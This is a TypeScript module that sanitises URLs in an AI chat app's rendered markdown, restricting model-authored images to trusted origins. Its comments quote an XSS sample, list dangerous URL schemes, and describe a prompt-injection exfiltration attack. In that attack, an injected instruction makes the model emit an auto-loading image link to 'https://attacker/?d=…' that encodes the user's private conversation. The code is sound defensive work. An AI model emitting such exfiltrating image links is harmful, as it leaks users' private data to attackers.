/**
 * URL allowlist for rendered markdown.
 *
 * react-markdown v10 has no allowDangerousHtml and `rehype-raw` is deliberately
 * NOT installed, so raw HTML in a model response is never parsed into nodes —
 * `<img src=x onerror=alert(1)>` renders as literal text. That is safety by
 * construction rather than by filtering, which is why no sanitiser is needed.
 *
 * (If rehype-raw is ever added, rehype-sanitize becomes mandatory.)
 *
 * This guard covers the remaining vector: link and image hrefs, where
 * javascript: / data:text/html / vbscript: are still reachable.
 *
 * `safeUrl` and `normalise` MOVED to @v1/backend/convex/urlGuard and are
 * re-exported here, so this module's import sites are unchanged. The report
 * EMAIL renderer needs the same guard and runs in Convex, and one
 * implementation of a security control beats two that can drift. It also gained
 * the unit tests there that it never had here.
 */

import { normalise, safeUrl } from "@v1/backend/convex/urlGuard";

export { safeUrl };

/**
 * Images are stricter than links, and stricter still than they used to be.
 *
 * PROMPT-INJECTION EXFILTRATION. Model output is markdown, so the model cannot
 * make the browser run script or fetch() — but `![](https://attacker/?d=…)`
 * auto-loads an image, and the query string carries whatever an injection made
 * the model encode about the user's private conversation. Allowing any https
 * host (the old behaviour) made that a working exfiltration channel.
 *
 * So a model-authored image may only point at somewhere the app already trusts:
 * its OWN origin, the Convex storage origin (where attachment/artifact/avatar
 * images live), or an inline data:image/blob:. An external image URL returns ""
 * here and the renderer shows it as a LINK instead — visible, clickable, but not
 * auto-fetched, so viewing it becomes a deliberate user action rather than a
 * silent request. A browser-level CSP `img-src` (next.config.mjs) enforces the
 * same boundary even if this filter is ever bypassed.
 *
 * data:image is now ALLOWED (a legitimate inline chart/thumbnail) — SVG is the
 * only worry there, and an <img>'s SVG cannot execute script or make requests,
 * so it is not an exfil or XSS vector the way a navigated SVG document is.
 */
export function safeImageUrl(url: string): string {
  if (!url) return "";
  const cleaned = normalise(url);
  if (!cleaned) return "";
  const lower = cleaned.toLowerCase();
  // Inline images are same-document — no network request leaves the page.
  if (lower.startsWith("data:image/") || lower.startsWith("blob:")) {
    return cleaned;
  }
  // A RELATIVE url (no scheme/authority of its own) is same-origin by
  // construction — `new URL` with no base throws on it — so it needs no origin
  // comparison and no `window`. That is the common case (a Convex storage path,
  // an app asset) and it is always allowed once the scheme checks above passed.
  let absolute: URL;
  try {
    absolute = new URL(cleaned);
  } catch {
    return cleaned; // relative → same-origin
  }
  // An ABSOLUTE url is trusted only if its origin is the app's own or Convex's.
  const trusted = new Set();
  if (typeof window !== "undefined") trusted.add(window.location.origin);
  const convex = process.env.NEXT_PUBLIC_CONVEX_URL;
  if (convex) {
    try {
      trusted.add(new URL(convex).origin);
    } catch {
      // ignore a malformed build-time value
    }
  }
  return trusted.has(absolute.origin) ? cleaned : "";
}

/** True when a rejected image URL is nonetheless a safe LINK target (http/https),
 *  so the renderer can offer it as a click-through instead of dropping it. */
export function isLinkableImage(url: string): boolean {
  const safe = safeUrl(url);
  return !!safe && /^https?:/i.test(safe);
}
